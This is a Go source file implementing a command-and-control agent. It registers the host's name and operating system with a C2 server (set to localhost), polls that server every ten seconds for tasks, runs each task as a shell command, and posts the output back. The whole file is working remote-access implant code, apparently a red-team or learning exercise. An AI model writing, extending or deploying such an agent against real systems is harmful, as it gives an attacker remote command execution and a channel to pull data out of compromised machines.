package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var (
	c2Server = "http://localhost:8080"
	agentID  string
)

type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

func main() {
	if err := checkIn(); err != nil {
		fmt.Println("Error checking in:", err)
		return
	}

	fmt.Printf("Agent checked in with ID: %s\n", agentID)

	// Loop de beaconing
	for {
		task, err := getTask()
		if err != nil {
			fmt.Println("Error getting task:", err)
			time.Sleep(30 * time.Second) // Aguarda antes de tentar novamente
			continue
		}

		if task.ID != "" {
			fmt.Printf("Received task %s: %s\n", task.ID, task.Command)
			result := executeTask(task)
			if err := postResult(task.ID, result); err != nil {
				fmt.Println("Error posting result:", err)
			}
		}

		time.Sleep(10 * time.Second) // Intervalo de beaconing
	}
}

func checkIn() error {
	hostname, _ := os.Hostname()
	payload := map[string]string{
		"hostname": hostname,
		"os":       runtime.GOOS,
	}

	jsonPayload, _ := json.Marshal(payload)

	resp, err := http.Post(c2Server+"/c2/checkin", "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var result map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return err
	}

	agentID = result["id"]
	return nil
}

func getTask() (Task, error) {
	var task Task
	resp, err := http.Get(fmt.Sprintf("%s/c2/tasks/%s", c2Server, agentID))
	if err != nil {
		return task, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return task, nil // No new task
	}

	if err := json.NewDecoder(resp.Body).Decode(&task); err != nil {
		return task, err
	}

	return task, nil
}

func executeTask(task Task) string {
	parts := strings.Split(task.Command, " ")
	cmd := exec.Command(parts[0], parts[1:]...)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("Error executing command: %s\n%s", err.Error(), out.String())
	}

	return out.String()
}

func postResult(taskID, result string) error {
	payload := map[string]string{
		"task_id": taskID,
		"result":  result,
	}

	jsonPayload, _ := json.Marshal(payload)

	url := fmt.Sprintf("%s/c2/results/%s", c2Server, agentID)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonPayload))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}
